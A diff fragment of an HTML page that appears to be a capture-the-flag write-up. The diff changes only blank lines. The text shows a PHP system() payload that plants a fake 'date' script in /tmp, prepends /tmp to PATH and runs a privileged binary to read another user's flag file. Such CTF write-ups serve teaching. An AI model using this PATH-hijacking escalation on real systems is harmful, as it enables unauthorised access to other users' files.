@@ -80,11 +80,9 @@
 <span class="p">}</span>
 </code></pre></div>
 
-
 <p>That <code>system("date")</code> call looks promising, so let's try to replace it with some useful bash statement instead:</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo &quot;cat /home/ctf_user2/.52942ab6e8a6dd0bd75a9029c2b5c574_flag2.txt&quot; &gt; /tmp/date &amp;&amp; chmod 777 /tmp/date &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; /home/ctf_user2/sysadmin&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </code></pre></div>
-
 
 <p>Check the proc file and catch the flag - success!</p>
             <a href="#" class="go-top">Go Top</a>
